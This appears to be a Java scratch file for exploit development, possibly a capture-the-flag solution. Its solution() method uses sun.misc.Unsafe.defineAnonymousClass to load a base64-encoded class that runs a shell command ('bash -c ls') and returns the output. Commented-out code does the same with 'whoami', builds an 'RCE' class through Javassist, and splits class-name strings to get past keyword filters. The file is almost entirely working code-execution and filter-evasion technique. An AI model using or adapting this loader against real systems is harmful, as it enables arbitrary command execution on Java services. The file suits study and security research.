import javassist.*;
import org.python.core.PyObject;
import sun.misc.Unsafe;
import util.ReflectionUtils;

import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.security.CodeSource;
import java.security.ProtectionDomain;
import java.security.cert.Certificate;
import java.util.Base64;

public class Test {
    String a;
    static {
        System.out.println(1);
    }

    public static void main(String[] args) throws Exception {
//        Field unsafeField = Unsafe.class.getDeclaredField("theUnsafe");
//        unsafeField.setAccessible(true);
//        Unsafe unsafe = (Unsafe) unsafeField.get(null);
//        PyObject builtinFunctions = (PyObject) unsafe.allocateInstance(Class.forName("org.python.core.BuiltinFunctions"));
//
//        Field index = ReflectionUtils.getFuckField(builtinFunctions.getClass(),"index");
//        System.out.println(index);
//         byte[] code = ClassPool.getDefault().getCtClass("RCE").toBytecode();
//         System.out.println(Base64.getEncoder().encodeToString(code));
//        Class<?> clazz = ClassLoader.getSystemClassLoader().loadClass("sun.misc.Unsafe");
//        Field field = clazz.getDeclaredField("theUnsafe");
//        field.setAccessible(true);
//        Unsafe unsafe = (Unsafe) field.get(null);
//        ClassLoader classLoader = ClassLoader.getSystemClassLoader();
//        ProtectionDomain domain = new ProtectionDomain(new CodeSource(null, (Certificate[]) null), null, classLoader, null);
//        Class<?> sem = ClassLoader.getSystemClassLoader().loadClass("javax.scr"+"ipt.Scrip"+"tEngineManager");
//        String CLASS_BYTE_Base64 = Base64.getEncoder().encodeToString(getEvilCode());
//        byte[] b = Base64.getDecoder().decode(CLASS_BYTE_Base64);
//        Class anonymousClass = unsafe.defineAnonymousClass(Class.class,b,null);
////        anonymousClass.newInstance();
////        String result = (String) anonymousClass.getMethod("printResult").invoke(String.class);
////        System.out.println(result);
////        String res = new java.util.Scanner(Runtime.getRuntime().exec("whoami").getInputStream()).useDelimiter("\\A").next();
////        System.out.println(res);
//        System.out.println(Base64.getEncoder().encodeToString(getEvilCode()));
//        unsafe.defineClass("RCE", b, 0, b.length, classLoader, domain);
//        Class<?> a = ClassLoader.getSystemClassLoader().loadClass("RCE");
        solution("123");
    }
    public static String[] solution(String s) throws Exception {
        Class<?> clazz = ClassLoader.getSystemClassLoader().loadClass("sun.misc.Unsafe");
        Field field = clazz.getDeclaredField("theUnsafe");
        field.setAccessible(true);
        Unsafe unsafe = (Unsafe) field.get(null);
        ClassLoader classLoader = ClassLoader.getSystemClassLoader();
        ProtectionDomain domain = new ProtectionDomain(new CodeSource(null, (Certificate[]) null), null, classLoader, null);
        String CLASS_BYTE_Base64 = "yv66vgAAADQAcQkAGwBCCgAcAEMIAEQHAEUKAAQAQwoARgBHBwBICgBGAEkHAEoHAEsIAEwIAE0KAE4ATwoACgBQCgAJAFEKAAkAUgcAUwoAEQBDCgARAFQIAFUKABEAVgoABABXBwBYBwBZCgAYAFoKAAQAVgcAXAcAXQcAXgEABnRoaXMkMAEADExRaW5nUXVlRXhwOwEABjxpbml0PgEADyhMUWluZ1F1ZUV4cDspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAFUkNFTUUBAAxJbm5lckNsYXNzZXMBABJMUWluZ1F1ZUV4cCRSQ0VNRTsBAAtwcmludFJlc3VsdAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQACYnIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQASTGphdmEvbGFuZy9TdHJpbmc7AQABZQEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEAB2NvbW1hbmQBAAFiAQAYTGphdmEvbGFuZy9TdHJpbmdCdWZmZXI7AQAHcnVudGltZQEAE0xqYXZhL2xhbmcvUnVudGltZTsBAARlY2hvAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEADVN0YWNrTWFwVGFibGUHAFwHAEgHAEUHAF8HADcHAEoHAFgBAApTb3VyY2VGaWxlAQAPUWluZ1F1ZUV4cC5qYXZhDAAeAB8MACAAYAEAAmxzAQAWamF2YS9sYW5nL1N0cmluZ0J1ZmZlcgcAXwwAYQBiAQAQamF2YS9sYW5nL1N0cmluZwwAYwBkAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIBAARiYXNoAQACLWMHAGUMAGYAZwwAIABoDAAgAGkMAGoAKgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDABrAGwBAAEKDABtACoMAGsAbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgwAIABvBwBwAQAQUWluZ1F1ZUV4cCRSQ0VNRQEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAEWphdmEvbGFuZy9SdW50aW1lAQADKClWAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBACwoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVmZmVyOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgEAClFpbmdRdWVFeHAAIQAbABwAAQAdAAEQEAAeAB8AAAACAAEAIAAhAAEAIgAAAD4AAgACAAAACiortQABKrcAArEAAAACACMAAAAGAAEAAAARACQAAAAWAAIAAAAKACUAKAAAAAAACgAeAB8AAQABACkAKgABACIAAAFXAAkABwAAAIMSA0y7AARZtwAFTbgABk4DvQAHOgQtGQS2AAhXuwAJWbsAClktBr0AB1kDEgtTWQQSDFNZBStTtgAItgANtwAOtwAPOgUBOgYZBbYAEFk6BsYAHyy7ABFZtwASGQa2ABMSFLYAE7YAFbYAFlen/9ynAA86BbsAGFkZBbcAGb8stgAasAABABUAbwByABcAAwAjAAAANgANAAAAFAADABUACwAWAA8AGAAVABoAHAAdAEUAHgBIAB8AUwAgAG8AJAByACIAdAAjAH4AJQAkAAAAUgAIAEUAKgArACwABQBIACcALQAuAAYAdAAKAC8AMAAFAAAAgwAlACgAAAADAIAAMQAuAAEACwB4ADIAMwACAA8AdAA0ADUAAwAVAG4ANgA3AAQAOAAAACYABP8ASAAHBwA5BwA6BwA7BwA8BwA9BwA+BwA6AAD5ACZCBwA/CwACAEAAAAACAEEAJwAAAAoAAQAbAFsAJgAB";
        byte[] b = Base64.getDecoder().decode(CLASS_BYTE_Base64);
        Class anonymousClass = unsafe.defineAnonymousClass(Class.class,b,null);
        anonymousClass.getConstructor().newInstance();
        String[] result = new String[1];
        Method printResult = anonymousClass.getMethod("printResult");
        result[0] = (String)printResult.invoke(unsafe.allocateInstance(anonymousClass));
        return result;
    }

    public static byte[] getEvilCode() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass= pool.getCtClass("RCE");
//        CtClass clazz = pool.makeClass("a");
//        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
//        constructor.setBody("new java.util.Scanner(Runtime.getRuntime().exec(\"whoami\").getInputStream()).useDelimiter(\"\\A\").next();System.out.println(res);");
//        clazz.addConstructor(constructor);
//        clazz.getClassFile().setMajorVersion(49);
        return ctClass.toBytecode();
    }
    public Test(String a){
        this.a = a;
    }
    private void DiaoWo(){
        System.out.println("DiaoWo");
    }

    private void DiaoDiaoWo(String a){
        System.out.println(a);
    }
}
